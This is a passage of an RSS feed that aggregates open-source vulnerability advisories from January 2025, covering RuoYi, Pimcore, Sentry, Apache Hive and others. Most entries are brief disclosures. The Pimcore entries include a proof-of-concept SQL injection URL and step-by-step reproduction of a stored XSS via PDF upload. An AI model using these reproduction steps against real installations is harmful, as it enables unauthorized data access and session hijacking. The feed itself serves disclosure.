                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-v664-qgx9-wf79</link>
                    <pubDate>2025-01-29T15:31:35Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-v664-qgx9-wf79'>https://osv.dev/vulnerability/GHSA-v664-qgx9-wf79</a><br>
                            <b>Published:</b> 2025-01-29T15:31:35Z<br>
                            <b>Severity:</b> 7.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitee.com/y_project/RuoYi'>https://gitee.com/y_project/RuoYi</a></li><li>- <a target='_blank' href='https://github.com/peccc/restful_vul/blob/main/ruoyi_elevation_of_privileges/ruoyi_elevation_of_privileges.md'>https://github.com/peccc/restful_vul/blob/main/ruoyi_elevation_of_privileges/ruoyi_elevation_of_privileges.md</a></li><li>- <a target='_blank' href='https://github.com/yangzongzhuan/RuoYi'>https://github.com/yangzongzhuan/RuoYi</a></li><li>- <a target='_blank' href='https://ruoyi.vip'>https://ruoyi.vip</a></li></ul><br>
                            <b>Details:</b> <b>RuoYi allowed unauthorized attackers to view the session ID of the admin in the system monitoring</b><br>RuoYi v4.8.0 was discovered to allow unauthorized attackers to view the session ID of the admin in the system monitoring. This issue can allow attackers to impersonate Admin users via using a crafted cookie.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-h5jh-rp76-q242: 5.7 | <b>RuoYi has insecure permissions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-h5jh-rp76-q242</link>
                    <pubDate>2025-01-29T15:31:35Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-h5jh-rp76-q242'>https://osv.dev/vulnerability/GHSA-h5jh-rp76-q242</a><br>
                            <b>Published:</b> 2025-01-29T15:31:35Z<br>
                            <b>Severity:</b> 5.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitee.com/y_project/RuoYi'>https://gitee.com/y_project/RuoYi</a></li><li>- <a target='_blank' href='https://github.com/peccc/restful_vul/blob/main/ruoyi_insecure_role_assignments/ruoyi_insecure_role_assignments.md'>https://github.com/peccc/restful_vul/blob/main/ruoyi_insecure_role_assignments/ruoyi_insecure_role_assignments.md</a></li><li>- <a target='_blank' href='https://github.com/yangzongzhuan/RuoYi'>https://github.com/yangzongzhuan/RuoYi</a></li><li>- <a target='_blank' href='https://ruoyi.vip'>https://ruoyi.vip</a></li></ul><br>
                            <b>Details:</b> <b>RuoYi has insecure permissions</b><br>Insecure permissions in RuoYi v4.8.0 allows authenticated attackers to escalate privileges by assigning themselves higher level roles.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qq5h-rjj9-q9qg: 4.9 | <b>RuoYi vulnerable to Denial of Service by attackers with admin privileges</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qq5h-rjj9-q9qg</link>
                    <pubDate>2025-01-29T15:31:35Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qq5h-rjj9-q9qg'>https://osv.dev/vulnerability/GHSA-qq5h-rjj9-q9qg</a><br>
                            <b>Published:</b> 2025-01-29T15:31:35Z<br>
                            <b>Severity:</b> 4.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitee.com/y_project/RuoYi'>https://gitee.com/y_project/RuoYi</a></li><li>- <a target='_blank' href='https://github.com/peccc/restful_vul/blob/main/ruoyi_dos/ruoyi_dos.md'>https://github.com/peccc/restful_vul/blob/main/ruoyi_dos/ruoyi_dos.md</a></li><li>- <a target='_blank' href='https://github.com/yangzongzhuan/RuoYi'>https://github.com/yangzongzhuan/RuoYi</a></li><li>- <a target='_blank' href='https://ruoyi.vip'>https://ruoyi.vip</a></li></ul><br>
                            <b>Details:</b> <b>RuoYi vulnerable to Denial of Service by attackers with admin privileges</b><br>An issue in the reset password interface of ruoyi v4.8.0 allows attackers with Admin privileges to cause a Denial of Service (DoS) by duplicating the login name of the account.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3412: 0 | Excessive resource consumption when unmarshalling Compose file with recursive loop in github.com&#x2F;compose-spec&#x2F;compose-go&#x2F;v2</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3412</link>
                    <pubDate>2025-01-29T00:02:38Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3412'>https://osv.dev/vulnerability/GO-2025-3412</a><br>
                            <b>Published:</b> 2025-01-29T00:02:38Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/docker/compose/issues/12235'>https://github.com/docker/compose/issues/12235</a></li></ul><br>
                            <b>Details:</b> Excessive resource consumption when unmarshalling Compose file with recursive loop in github.com&#x2F;compose-spec&#x2F;compose-go&#x2F;v2
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3408: 0 | <b>WITHDRAWN: DefaultConfig has dangerous defaults causing hung Read in github.com&#x2F;hashicorp&#x2F;yamux</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3408</link>
                    <pubDate>2025-01-29T00:01:34Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3408'>https://osv.dev/vulnerability/GO-2025-3408</a><br>
                            <b>Published:</b> 2025-01-29T00:01:34Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/hashicorp/yamux/issues/142'>https://github.com/hashicorp/yamux/issues/142</a></li></ul><br>
                            <b>Details:</b> <b>WITHDRAWN: DefaultConfig has dangerous defaults causing hung Read in github.com&#x2F;hashicorp&#x2F;yamux</b><br>(This report has been withdrawn with reason: &quot;By request of maintainer in https:&#x2F;&#x2F;github.com&#x2F;golang&#x2F;vulndb&#x2F;issues&#x2F;3453&quot;).

The default values for Session.config.KeepAliveInterval and Session.config.ConnectionWriteTimeout of 30s and 10s create the possibility for timed out writes that most aren&#x27;t handling in their readers.

Calls to Stream.Read on one side of a connection will hang until the underlying Session is closed if the corresponding Stream.Write call on the other side it&#x27;s waiting for returns with ErrConnectionWriteTimeout. This happens in the case of network congestion between the two sides.

If you keep Session.sendCh full (fixed capacity of 64) for ConnectionWriteTimeout, but for less than the KeepAliveInterval + ConnectionWriteTimeout (which would kill the Session), Stream.Write will return ErrConnectionWriteTimeout. The state of the underlying Session or Stream is not modified. When this happens, the other side&#x27;s Stream.Read call that&#x27;s waiting for that write will never return because there&#x27;s no timeout for this edge-case.

Since no keep alive timed out, you can continue to use the Session once the network congestion is resolved, but that Stream.Read call will only return when the Session closes or the response shows up. Since the write call on the other side timed out the call to Stream.Read will never return.

Any conditions that cause network writes to stall for 10-30 seconds can trigger this Denial of Service- extremely high CPU contention on either side of the connection, BGP reconvergence, etc. To resolve the Denial of Service issue, you have to re-establish the connections, which will usually require a hard restart of the service on either end of the connection.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3424: 0 | <b>Anubis has a bot protection bypass when a sophisticated attacker asks to pass a challenge of difficulty 0 in github.com&#x2F;Xe&#x2F;x</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3424</link>
                    <pubDate>2025-01-29T00:01:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3424'>https://osv.dev/vulnerability/GO-2025-3424</a><br>
                            <b>Published:</b> 2025-01-29T00:01:32Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Xe/x/security/advisories/GHSA-56w8-8ppj-2p4f'>https://github.com/Xe/x/security/advisories/GHSA-56w8-8ppj-2p4f</a></li><li>- <a target='_blank' href='https://xeiaso.net/notes/2025/GHSA-56w8-8ppj-2p4f'>https://xeiaso.net/notes/2025/GHSA-56w8-8ppj-2p4f</a></li></ul><br>
                            <b>Details:</b> <b>Anubis has a bot protection bypass when a sophisticated attacker asks to pass a challenge of difficulty 0 in github.com&#x2F;Xe&#x2F;x</b><br>Anubis has a bot protection bypass when a sophisticated attacker asks to pass a challenge of difficulty 0 in github.com&#x2F;Xe&#x2F;x.

NOTE: The source advisory for this report contains additional versions that could not be automatically mapped to standard Go module versions.

(If this is causing false-positive reports from vulnerability scanners, please suggest an edit to the report.)

The additional affected modules and versions are: github.com&#x2F;Xe&#x2F;x before v1.11.0-37-gd98d70a.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-57519: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-57519</link>
                    <pubDate>2025-01-28T23:15:08Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-57519'>https://osv.dev/vulnerability/CVE-2024-57519</a><br>
                            <b>Published:</b> 2025-01-28T23:15:08Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/open5gs/open5gs/issues/3635'>https://github.com/open5gs/open5gs/issues/3635</a></li><li>- <a target='_blank' href='https://github.com/f4rs1ght/vuln-research/tree/main/CVE-2024-57519'>https://github.com/f4rs1ght/vuln-research/tree/main/CVE-2024-57519</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue in Open5GS v.2.7.2 allows a remote attacker to cause a denial of service via the ogs_dbi_auth_info function in lib&#x2F;dbi&#x2F;subscription.c file.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r5w7-f542-q2j4: 3.7 | <b>Potential DoS when using ContextLines integration</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r5w7-f542-q2j4</link>
                    <pubDate>2025-01-28T20:37:26Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r5w7-f542-q2j4'>https://osv.dev/vulnerability/GHSA-r5w7-f542-q2j4</a><br>
                            <b>Published:</b> 2025-01-28T20:37:26Z<br>
                            <b>Severity:</b> 3.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4'>https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li><li>- <a target='_blank' href='https://github.com/getsentry/sentry-javascript/issues/14892'>https://github.com/getsentry/sentry-javascript/issues/14892</a></li><li>- <a target='_blank' href='https://github.com/getsentry/sentry-javascript/pull/14997'>https://github.com/getsentry/sentry-javascript/pull/14997</a></li><li>- <a target='_blank' href='https://github.com/getsentry/sentry-javascript'>https://github.com/getsentry/sentry-javascript</a></li></ul><br>
                            <b>Details:</b> <b>Potential DoS when using ContextLines integration</b><br>### Impact
The [ContextLines integration](https:&#x2F;&#x2F;docs.sentry.io&#x2F;platforms&#x2F;javascript&#x2F;guides&#x2F;node&#x2F;configuration&#x2F;integrations&#x2F;contextlines&#x2F;) uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.

The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).

The ContextLines integration is enabled by default in the Node SDK (`@sentry&#x2F;node`) and SDKs that run in Node.js environments (`@sentry&#x2F;astro`, `@sentry&#x2F;aws-serverless`, `@sentry&#x2F;bun`, `@sentry&#x2F;google-cloud-serverless`, `@sentry&#x2F;nestjs`, `@sentry&#x2F;nextjs`, `@sentry&#x2F;nuxt`, `@sentry&#x2F;remix`, `@sentry&#x2F;solidstart`, `@sentry&#x2F;sveltekit`).

### Patches

Users should upgrade to version `8.49.0` or higher.

### Workarounds

To remediate this issue in affected versions without upgrading to version `8.49.0` and above you can disable the ContextLines integration. See the [docs](https:&#x2F;&#x2F;docs.sentry.io&#x2F;platforms&#x2F;javascript&#x2F;guides&#x2F;node&#x2F;configuration&#x2F;integrations&#x2F;#removing-a-default-integration) for more details.

```js
Sentry.init({
  &#x2F;&#x2F; ...
  integrations: function (integrations) {
    &#x2F;&#x2F; integrations will be all default integrations
    return integrations.filter(function (integration) {
      return integration.name !== &quot;ContextLines&quot;;
    });
  },
});
```

If you disable the ContextLines integration, you will lose source context on your error events.

### References
- Reported issue: https:&#x2F;&#x2F;github.com&#x2F;getsentry&#x2F;sentry-javascript&#x2F;issues&#x2F;14892
- PR Fix: https:&#x2F;&#x2F;github.com&#x2F;getsentry&#x2F;sentry-javascript&#x2F;pull&#x2F;14997

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-q53r-9hh9-w277: 7.2 | <b>pimcore&#x2F;customer-data-framework vulnerable to SQL Injection</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-q53r-9hh9-w277</link>
                    <pubDate>2025-01-28T19:14:50Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-q53r-9hh9-w277'>https://osv.dev/vulnerability/GHSA-q53r-9hh9-w277</a><br>
                            <b>Published:</b> 2025-01-28T19:14:50Z<br>
                            <b>Severity:</b> 7.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pimcore/pimcore/security/advisories/GHSA-q53r-9hh9-w277'>https://github.com/pimcore/pimcore/security/advisories/GHSA-q53r-9hh9-w277</a></li><li>- <a target='_blank' href='https://github.com/pimcore/customer-data-framework/releases/tag/v4.2.1'>https://github.com/pimcore/customer-data-framework/releases/tag/v4.2.1</a></li><li>- <a target='_blank' href='https://github.com/pimcore/pimcore'>https://github.com/pimcore/pimcore</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.293906'>https://vuldb.com/?ctiid.293906</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.293906'>https://vuldb.com/?id.293906</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.451863'>https://vuldb.com/?submit.451863</a></li></ul><br>
                            <b>Details:</b> <b>pimcore&#x2F;customer-data-framework vulnerable to SQL Injection</b><br>An SQL injection vulnerability allows any authenticated user to execute arbitrary SQL commands on the server. This can lead to unauthorized access to sensitive data, data modification, or even complete control over the server.

Details
The vulnerability is found in the URL parameters of the following endpoint:

`GET &#x2F;admin&#x2F;customermanagementframework&#x2F;customers&#x2F;list?add-new-customer=1&amp;apply-segment-selection=Apply&amp;filterDefinition[allowedRoleIds][]=1&amp;filterDefinition[allowedUserIds][]=2&amp;filterDefinition[id]=0&amp;filterDefinition[name]=RDFYjolf&amp;filterDefinition[readOnly]=on&amp;filterDefinition[shortcutAvailable]=on&amp;filter[active]=1&amp;filter[email]=testing%40example.com&amp;filter[firstname]=RDFYjolf&amp;filter[id]=1&amp;filter[lastname]=RDFYjolf&amp;filter[operator-customer]=AND&amp;filter[operator-segments]=%40%40dz1Uu&amp;filter[search]=the&amp;filter[segments][832][]=847&amp;filter[segments][833][]=835&amp;filter[segments][874][]=876&amp;filter[showSegments][]=832 HTTP&#x2F;1.1`

The parameters filterDefinition and filter are vulnerable to SQL injection. When a specially crafted input is provided, it results in an SQL error, indicating that the input is being directly used in an SQL query without proper sanitization.

PoC
To reproduce the vulnerability, follow these steps:

Open a web browser or a tool like curl or Postman.
Authenticate with valid user credentials.
Navigate to the following URL with the vulnerable parameters:
```
https:&#x2F;&#x2F;demo.pimcore.fun&#x2F;admin&#x2F;customermanagementframework&#x2F;customers&#x2F;list?add-new-customer=1&amp;apply-segment-selection=Apply&amp;filterDefinition[allowedRoleIds][]=1&amp;filterDefinition[allowedUserIds][]=2&amp;filterDefinition[id]=0&amp;filterDefinition[name]=RDFYjolf&amp;filterDefinition[readOnly]=on&amp;filterDefinition[shortcutAvailable]=on&amp;filter[active]=1&amp;filter[email]=testing%40example.com&amp;filter[firstname]=RDFYjolf&amp;filter[id]=1&amp;filter[lastname]=RDFYjolf&amp;filter[operator-customer]=AND&amp;filter[operator-segments]=%40%40dz1Uu&amp;filter[search]=the&amp;filter[segments][832][]=847&amp;filter[segments][833][]=835&amp;filter[segments][874][]=876&amp;filter[showSegments][]=832
Observe the error message indicating an SQL error:
Error while building customer list: An exception occurred while executing a query: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;@_0 ON `fltr_seg_832_0_@_0`.fieldname IN (&#x27;manualSegments&#x27;,&#x27;calculatedSegment...&#x27; at line 1
```
Impact
This is an SQL injection vulnerability. It impacts any authenticated user who can access the affected endpoint. An attacker can exploit this vulnerability to execute arbitrary SQL commands, potentially leading to data breaches, data loss, or full server compromise.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-xr3m-6gq6-22cg: 8.1 | <b>Pimcore Authenticated Stored Cross-Site Scripting (XSS) Via Search Document</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-xr3m-6gq6-22cg</link>
                    <pubDate>2025-01-28T19:12:44Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-xr3m-6gq6-22cg'>https://osv.dev/vulnerability/GHSA-xr3m-6gq6-22cg</a><br>
                            <b>Published:</b> 2025-01-28T19:12:44Z<br>
                            <b>Severity:</b> 8.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pimcore/pimcore/security/advisories/GHSA-xr3m-6gq6-22cg'>https://github.com/pimcore/pimcore/security/advisories/GHSA-xr3m-6gq6-22cg</a></li><li>- <a target='_blank' href='https://github.com/pimcore/pimcore'>https://github.com/pimcore/pimcore</a></li></ul><br>
                            <b>Details:</b> <b>Pimcore Authenticated Stored Cross-Site Scripting (XSS) Via Search Document</b><br>### Summary
 
A Stored Cross-Site Scripting (XSS) vulnerability in PIMCORE allows remote attackers to inject arbitrary web script or HTML via the PDF upload functionality. This can result in the execution of malicious scripts in the context of the user&#x27;s browser when the PDF is viewed, leading to potential session hijacking, defacement of web pages, or unauthorized access to sensitive information.
 
### Details
 
The vulnerability is present in the PDF upload functionality of the PIM Core Upload module. When a user uploads a PDF file, the application fails to properly sanitize the content, allowing embedded scripts to be executed when the PDF is viewed. The affected code is located in the file handling and rendering logic of the PDF upload feature.
 
### PoC
 

 
1. Log in as Administrator
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7945bbd7-5277-4a0e-8365-56e5df319bae)

2. Hover to Assets
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;f24645ee-d740-4a5e-81d1-b8bf48b71cce)

 
3. Right click and click &quot;Add Asset(s) &amp;gt; upload files
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;0603cc90-44d8-423e-a01c-b0367fd929bd)

 
4. Upload malicious pdf
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;51aa609d-f100-4f46-b3bb-3d730e000a02)

 
5. Click on search and select document
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7e945b26-4f8a-4e91-adea-8f46a0f17856)

 
6. copy the path and open to a new tab 

[https:&#x2F;&#x2F;demo.pimcore.fun&#x2F;admin&#x2F;Sample C](https:&#x2F;&#x2F;demo.pimcore.fun&#x2F;Sample%20Content&#x2F;Documents&#x2F;xssmaeitsec.pdf)
 
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;500d49d6-42f7-4b64-8b01-117f439ace8d)

7. XSS PDF can be access without authentication. 

 
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7fb53fc2-2f65-42b3-9ed7-fc0413211a3f)

 Image showing no cookies indicator that there are no session currently in
 
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;89f58fff-0dee-4520-9071-efd024c2f6d3)

### Impact
This is a Stored Cross-Site Scripting (XSS) vulnerability. It impacts any user who views the malicious PDF, potentially leading to session hijacking, defacement of web pages, or unauthorized access to sensitive information. The severity is high due to the potential for significant impact on confidentiality and integrity.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-23211: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-23211</link>
                    <pubDate>2025-01-28T16:15:40Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-23211'>https://osv.dev/vulnerability/CVE-2025-23211</a><br>
                            <b>Published:</b> 2025-01-28T16:15:40Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TandoorRecipes/recipes/blob/4f9bff20c858180d0f7376de443a9fe4c123a50c/cookbook/helper/template_helper.py#L95'>https://github.com/TandoorRecipes/recipes/blob/4f9bff20c858180d0f7376de443a9fe4c123a50c/cookbook/helper/template_helper.py#L95</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Tandoor Recipes is an application for managing recipes, planning meals, and building shopping lists. A Jinja2 SSTI vulnerability allows any user to execute commands on the server. In the case of the provided Docker Compose file as root. This vulnerability is fixed in 1.5.24.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8m8m-98c9-vw7q: 4.7 | <b>Duplicate Advisory: pimcore&#x2F;customer-data-framework vulnerable to SQL Injection: Hibernate</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8m8m-98c9-vw7q</link>
                    <pubDate>2025-01-28T15:31:57Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8m8m-98c9-vw7q'>https://osv.dev/vulnerability/GHSA-8m8m-98c9-vw7q</a><br>
                            <b>Published:</b> 2025-01-28T15:31:57Z<br>
                            <b>Severity:</b> 4.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pimcore/pimcore/security/advisories/GHSA-q53r-9hh9-w277'>https://github.com/pimcore/pimcore/security/advisories/GHSA-q53r-9hh9-w277</a></li><li>- <a target='_blank' href='https://github.com/pimcore/customer-data-framework/releases/tag/v4.2.1'>https://github.com/pimcore/customer-data-framework/releases/tag/v4.2.1</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.293906'>https://vuldb.com/?ctiid.293906</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.293906'>https://vuldb.com/?id.293906</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.451863'>https://vuldb.com/?submit.451863</a></li></ul><br>
                            <b>Details:</b> <b>Duplicate Advisory: pimcore&#x2F;customer-data-framework vulnerable to SQL Injection: Hibernate</b><br>## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-q53r-9hh9-w277. This link is maintained to preserve external references.

## Original Description
A vulnerability, which was classified as critical, has been found in Pimcore customer-data-framework up to 4.2.0. Affected by this issue is some unknown functionality of the file &#x2F;admin&#x2F;customermanagementframework&#x2F;customers&#x2F;list. The manipulation of the argument filterDefinition&#x2F;filter leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 4.2.1 is able to address this issue. It is recommended to upgrade the affected component.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3422: 0 | imgproxy is vulnerable to SSRF against 0.0.0.0 in github.com&#x2F;imgproxy&#x2F;imgproxy</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3422</link>
                    <pubDate>2025-01-28T15:01:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3422'>https://osv.dev/vulnerability/GO-2025-3422</a><br>
                            <b>Published:</b> 2025-01-28T15:01:32Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/imgproxy/imgproxy/security/advisories/GHSA-j2hp-6m75-v4j4'>https://github.com/imgproxy/imgproxy/security/advisories/GHSA-j2hp-6m75-v4j4</a></li></ul><br>
                            <b>Details:</b> imgproxy is vulnerable to SSRF against 0.0.0.0 in github.com&#x2F;imgproxy&#x2F;imgproxy
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3409: 0 | <b>Zot IdP group membership revocation ignored in zotregistry.dev&#x2F;zot</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3409</link>
                    <pubDate>2025-01-28T15:01:21Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3409'>https://osv.dev/vulnerability/GO-2025-3409</a><br>
                            <b>Published:</b> 2025-01-28T15:01:21Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> go<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/project-zot/zot/blob/5e30fec65c49e3139907e2819ccb39b2e3bd784e/pkg/meta/boltdb/boltdb.go#L1665'>https://github.com/project-zot/zot/blob/5e30fec65c49e3139907e2819ccb39b2e3bd784e/pkg/meta/boltdb/boltdb.go#L1665</a></li><li>- <a target='_blank' href='https://github.com/project-zot/zot/commit/002ac62d8a15bf0cba010b3ba7bde86f9837b613'>https://github.com/project-zot/zot/commit/002ac62d8a15bf0cba010b3ba7bde86f9837b613</a></li></ul><br>
                            <b>Details:</b> <b>Zot IdP group membership revocation ignored in zotregistry.dev&#x2F;zot</b><br>Zot IdP group membership revocation ignored in zotregistry.dev&#x2F;zot.

NOTE: The source advisory for this report contains additional versions that could not be automatically mapped to standard Go module versions.

(If this is causing false-positive reports from vulnerability scanners, please suggest an edit to the report.)

The additional affected modules and versions are: zotregistry.dev&#x2F;zot before v2.1.2.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-p953-3j66-hg45: 6.5 | <b>Apache Hive vulnerable to Observable Timing Discrepancy and Authentication Bypass by Spoofing</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-p953-3j66-hg45</link>
                    <pubDate>2025-01-28T09:32:34Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-p953-3j66-hg45'>https://osv.dev/vulnerability/GHSA-p953-3j66-hg45</a><br>
                            <b>Published:</b> 2025-01-28T09:32:34Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/apache/hive/commit/b418e3c9f479ba8e7d31e6470306111002ffa809'>https://github.com/apache/hive/commit/b418e3c9f479ba8e7d31e6470306111002ffa809</a></li><li>- <a target='_blank' href='https://blog.gypsyengineer.com/en/security/preventing-timing-attacks-with-codeql.html'>https://blog.gypsyengineer.com/en/security/preventing-timing-attacks-with-codeql.html</a></li><li>- <a target='_blank' href='https://cqr.company/web-vulnerabilities/timing-attacks'>https://cqr.company/web-vulnerabilities/timing-attacks</a></li><li>- <a target='_blank' href='https://github.com/apache/hive'>https://github.com/apache/hive</a></li><li>- <a target='_blank' href='https://issues.apache.org/jira/browse/HIVE-28030'>https://issues.apache.org/jira/browse/HIVE-28030</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread/0nloywj49nbtlc6l3c6363qvq7o1ztb7'>https://lists.apache.org/thread/0nloywj49nbtlc6l3c6363qvq7o1ztb7</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2025/01/28/3'>http://www.openwall.com/lists/oss-security/2025/01/28/3</a></li></ul><br>
                            <b>Details:</b> <b>Apache Hive vulnerable to Observable Timing Discrepancy and Authentication Bypass by Spoofing</b><br>Use of Arrays.equals() in LlapSignerImpl in Apache Hive to compare message signatures allows attacker to forge a valid signature for an arbitrary message byte by byte. The attacker should be an authorized user of the product to perform this attack. Users are recommended to upgrade to version 4.0.0, which fixes this issue.

The problem occurs when an application doesn’t use a constant-time algorithm for validating a signature. The method Arrays.equals() returns false right away when it sees that one of the input’s bytes are different. It means that the comparison time depends on the contents of the arrays. This little thing may allow an attacker to forge a valid signature for an arbitrary message byte by byte. So it might allow malicious users to submit splits&#x2F;work with selected signatures to LLAP without running as a privileged user, potentially leading to DDoS attack.

More details in the reference section.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-23953: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-23953</link>
                    <pubDate>2025-01-28T09:15:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-23953'>https://osv.dev/vulnerability/CVE-2024-23953</a><br>
                            <b>Published:</b> 2025-01-28T09:15:09Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
